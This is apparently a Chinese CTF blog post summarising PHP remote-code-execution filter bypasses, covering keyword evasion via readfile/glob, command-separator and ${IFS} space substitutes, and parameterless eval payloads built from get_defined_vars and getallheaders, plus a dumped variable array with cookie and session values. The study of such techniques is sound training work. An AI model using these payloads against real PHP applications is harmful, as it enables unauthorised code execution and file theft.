---
title: RCE进阶总结
date: 2026-02-05 14:31:14
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/img/image-20260210225914494.png
categories: CTF
---

最近遇到一些RCE题目绕过方式比较新奇，在这里总结一下

## 读取文件

很多题目把linux命令中常见的cat，more，less等等都过滤了

[CTF里读取文件相关知识点总结(持续更新中) – fushulingのblog](https://fushuling.com/index.php/2023/04/14/ctf里读取文件相关知识点总结/)

当然也可以直接使用函数

- readfile

  [PHP readfile() 函数 | 菜鸟教程](https://www.runoob.com/php/func-filesystem-readfile.html)

  可以`readfile('/fl'.'ag');`绕过关键字过滤

- file_get_contents

  这个没有回显，需要`echo file_get_contents('/flag');`

- highlight_file

  `highlight_file(glob("/f*")[0]);`

## 读取目录

- getcwd()

  返回当前工作目录

- dirname()

   返回路径中的目录部分。多次嵌套 `dirname()` 可以到达根目录。

- scandir()

  列出根目录下的所有文件

- glob()

  [PHP glob() 函数 | 菜鸟教程](https://www.runoob.com/php/func-filesystem-glob.html)

## 命令执行

有些题目过滤了system，除了像上文那样读取目录然后读取文件，还可以找到system的替代



## Bypass

### 命令分割符   

%0a  %0d ; &  && | || 

### 空格

<、<>、${IFS}、$IFS、$IFS$9

### 关键字

- 单引号(')双引号("")反引号(``)
- 反斜杠\

## 无参🐎

这里参考了一下E73RN4L师哥的周报

### 方法一 

```
code=eval(array_pop(next(get_defined_vars())));&1=phpinfo();
```

### 方法二

current(get_defined_vars())指针移到GET到的变

上处第一个current()可以替换为end()或reset()，均能利用到GET的内

```
code=eval(current(current(get_defined_vars())));&1=phpinfo();
```

### 方法三

先POST指令1=system('cat /Th1s_1s_R2a1_flag'); 

再code=print_r(get_defined_vars());得到当前已定义变量 

```
Array ( 
[_GET] => Array ( ) 
[_POST] => Array ( [m1xian] => print_r(get_defined_vars()); [1] => system('cat 
/flag'); ) 
[_COOKIE] => Array ( [_ga_606P6J79WH] => GS2.1.s1764249013$o7$g1$t1764249199$j59$l0$h0 
[_ga] => GA1.1.520328125.1763355284 [PHPSESSID] => c9a113d9fc4159ab9e4bb5bebb663742 
[session] => eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiIxMSJ9.aUZ7iw.Yh-1kHByedh
JWt1GG_rwNyKJMc ) [_FILES] => Array ( ) ) 
```

发现要利用的POST请求在第二个元组中的第二个内容 

```
code=eval(next(next(get_defined_vars()))); 
```

上面第一处next()可以换成end()

### 方法四

getallheaders()返回所有的HTTP头信息

```
code=print_r(getallheaders());
```

发现HTTP头信息按倒序排列，所以把a: system('cat /*');放在最后，在数组中就是第一个

```
code=eval(current(getallheaders()));
```

